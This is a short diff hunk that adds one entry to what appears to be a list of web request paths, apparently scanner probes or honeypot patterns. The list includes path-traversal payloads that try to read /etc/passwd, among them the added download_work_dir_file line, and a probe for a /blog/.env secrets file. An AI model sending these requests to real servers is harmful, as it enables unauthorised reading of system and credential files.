@@ -38,3 +38,4 @@
 /installed_emanual_list.html
 /blog/.env
 /tileserver.php/x/1/1/1?Format=/../../../../../../../../../../../../../../etc/passwd&Request=x&layer=.
+/download_work_dir_file?path=/etc/passwd
